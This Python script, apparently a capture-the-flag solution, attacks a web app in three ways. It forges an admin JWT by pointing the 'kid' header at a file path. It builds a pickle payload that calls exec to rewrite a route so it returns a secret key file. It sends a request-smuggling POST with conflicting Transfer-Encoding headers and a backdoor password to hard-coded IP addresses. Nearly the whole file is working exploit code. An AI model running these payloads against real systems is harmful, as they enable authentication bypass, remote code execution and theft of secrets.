import requests
import base64
import pickle
import jwt


kid = "frontend/src/app.py"

def login():
    user_info = {"username": "abc", "isadmin": True}
    key = get_key(kid)
    token = jwt.encode(user_info, key, algorithm="HS256", headers={"kid": kid})
    return token

def get_key(kid):
    key = ""
    dir = "/app/"
    try:
        with open(dir+kid, "r") as f:
            key = f.read()
    except:
        pass
    print(key)
    return key

def verify_token(token):
    header = jwt.get_unverified_header(token)
    kid = header["kid"]
    key = get_key(kid)
    try:
        payload = jwt.decode(token, key, algorithms=["HS256"])
        return True
    except:
        return False

class A:
    def __reduce__(self):
        # return exec, ("web.redirect(open('frontend/src/frontend_key').read())",)
        return exec, ("index.GET = lambda x: open('frontend/src/frontend_key').read()",)

# data1 = base64.b64encode(pickle.dumps(A()))
# # data1 = base64.b64encode(pickle.dumps([1, 2, 3]))
# data2 = b"BackdoorPasswordOnlyForAdmin"
# data = hex(len(data1))[2:].encode() + b"\r\n" + data1 + b"\r\n" + b"0\r\n\r\n" + data2
# data = hex(len(data))[2:].encode() + b"\r\n" + data + b"\r\n0\r\n\r\n"


data1 = base64.b64encode(pickle.dumps(A()))
# data1 = base64.b64encode(pickle.dumps([1, 2, 3]))
# data2 = b"BackdoorPasswordOnlyForAdmin"
data2 = "BackdoorPasswordOnlyForAdmin"
# data2 = "BackdoorPasswordOnlyForAdminÀ"
# data = f"{data1}{5 * 'À'}{data2}"
# data = f"{data1}'À'{data2}"
data = data2
data = hex(len(data.encode()))[2:].encode() + b"\r\n" + data.encode() + b"\r\n0\r\n\r\n"

url1 = "http://192.168.68.70:8081/admin"
url2 = "http://192.168.68.70:8081/backend"
# url1 = "http://47.103.219.45:32102/admin"
# url2 = "http://47.103.219.45:32102/backend"
# response = requests.post(url1, data=data, cookies={"token": login()}, headers={"Transfer-encoding": "CHUNKED", "Transfer_encoding": "1", "Content-Length": "5", "Content-Type": "text/plain"})
response = requests.post(url1, data=data, cookies={"token": login()}, headers={"Transfer-encoding": "CHUNKED", "Transfer-encodinga": "1", "Content-Length": "5", "Content-Type": "text/plain"})
# response = requests.post(url1, data=data, cookies={"token": login()}, headers={"Content-Length": "5", "Content-Type": "text/plain"})
# response = requests.post(url1, data=data, cookies={"token": login()})

print(response)
print(response.content)
print(response.url)

response = requests.get(url2)

print(response)
print(response.content)
print(response.url)
